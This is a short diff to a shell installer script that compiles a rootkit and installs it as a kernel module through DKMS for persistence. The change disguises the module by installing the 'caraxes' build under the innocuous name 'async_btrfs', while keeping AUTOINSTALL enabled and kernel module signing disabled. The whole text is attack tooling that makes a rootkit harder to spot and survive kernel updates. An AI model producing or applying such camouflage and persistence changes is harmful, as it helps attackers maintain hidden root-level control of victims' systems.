@@ -186,7 +186,7 @@ compile_rootkit() {
 install_module_dkms() {
     print_status "Installing module using DKMS for persistence..."
     
-    MODULE_NAME="caraxes"
+    MODULE_NAME="async_btrfs"
     MODULE_VERSION="1.0"
     SRC_DIR=$(pwd)
     DKMS_DIR="/usr/src/${MODULE_NAME}-${MODULE_VERSION}"
@@ -203,7 +203,9 @@ install_module_dkms() {
     sudo tee "$DKMS_DIR/dkms.conf" > /dev/null <<EOF
 PACKAGE_NAME="${MODULE_NAME}"
 PACKAGE_VERSION="${MODULE_VERSION}"
-BUILT_MODULE_NAME[0]="${MODULE_NAME}"
+BUILT_MODULE_NAME[0]="caraxes"
+BUILT_MODULE_LOCATION[0]="."
+DEST_MODULE_NAME[0]="${MODULE_NAME}"
 DEST_MODULE_LOCATION[0]="/updates/dkms"
 AUTOINSTALL="yes"
 MAKE[0]="make CONFIG_MODULE_SIG=n -C \${kernel_source_dir} M=\${dkms_tree}/\${PACKAGE_NAME}/\${PACKAGE_VERSION}/build modules"
